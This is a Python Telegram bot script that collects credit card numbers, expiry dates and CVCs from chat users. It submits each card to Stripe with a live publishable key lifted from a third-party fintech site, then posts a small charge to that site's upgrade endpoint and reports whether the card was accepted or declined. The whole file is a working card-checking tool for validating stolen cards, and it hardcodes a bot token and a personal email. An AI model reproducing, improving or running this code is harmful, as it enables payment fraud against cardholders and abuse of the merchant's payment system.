import telebot
import requests
import json

# Your Telegram bot token
BOT_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "Send your credit card details in one message:\n"
        "CARDNUMBER,MM,YY,CVC\n"
        "Example: 4147098797621083,10,28,202"
    )

@bot.message_handler(func=lambda message: True)
def handle_card(message):
    try:
        text = message.text.strip()
        parts = [p.strip() for p in text.split(',')]
        if len(parts) != 4:
            bot.send_message(message.chat.id, "Invalid format. Please send as: CARDNUMBER,MM,YY,CVC")
            return

        card_number, exp_month, exp_year, cvc = parts
        email = "peshangsalam2001@gmail.com"  # your fixed email

        # Step 1: Send POST to first URL with your data
        first_url = "https://api.stripe.com/v1/payment_methods"
        headers = {
            "Host": "api.stripe.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "accept": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15"
        }
        data = {
            "type": "card",
            "billing_details[email]": email,
            "billing_details[address][postal_code]": "10080",
            "card[number]": card_number,
            "card[cvc]": cvc,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "key": "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL"
        }

        response = requests.post(first_url, headers=headers, data=data)
        response_text = response.text
        print("Raw response from first URL:", response_text)  # Debug output

        # Try to parse JSON
        try:
            response_json = json.loads(response_text)
        except Exception as e:
            print("Failed to parse JSON:", e)
            bot.send_message(message.chat.id, "Error parsing response from first URL.")
            return

        # Extract pm_value (payment method id)
        pm_id = response_json.get("id")
        if not pm_id:
            bot.send_message(message.chat.id, "Failed to get payment method ID.")
            return

        print("Extracted pm_value:", pm_id)  # Debug

        # Step 2: Send pm_id to your second URL
        second_url = "https://www.popularfintech.com/upgrade?_data=routes%2Fupgrade"
        headers2 = {
            "Host": "www.popularfintech.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "sec-fetch-mode": "cors",
            "referer": "https://www.popularfintech.com/",
            "sentry-trace": "sample-trace-id"
        }
        data2 = {
            "email": "peshangsalam2001@gmail.com",
            "force_three_d_secure": "false",
            "price_id": "your_price_id",  # replace with your actual price ID if needed
            "payment_method": pm_id,
            "amount_cents": "100",
            "upgrade_error_message": "Oops%2C+something+went+wrong.",
            "upgrade_success_message": "You+are+now+a+premium+subscriber"
        }

        second_response = requests.post(second_url, headers=headers2, data=data2)
        second_response_text = second_response.text
        print("Raw response from second URL:", second_response_text)  # Debug

        # Parse the second response JSON
        try:
            resp_json = json.loads(second_response_text)
        except Exception as e:
            print("Failed to parse second URL response JSON:", e)
            bot.send_message(message.chat.id, "Error parsing response from second URL.")
            return

        # Check for decline or success
        if 'toast' in resp_json:
            toast = resp_json['toast']
            status = toast.get('status')
            message_str = toast.get('message', '')
            if status == 'error':
                bot.send_message(message.chat.id, f"Your card was declined:\n{message_str}")
            elif status == 'success':
                bot.send_message(message.chat.id, "✅ Payment succeeded! Your card was accepted.")
            else:
                bot.send_message(message.chat.id, f"Response: {second_response_text}")
        else:
            bot.send_message(message.chat.id, f"Unexpected response: {second_response_text}")

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
        print("Error:", e)

# Run the bot
bot.polling()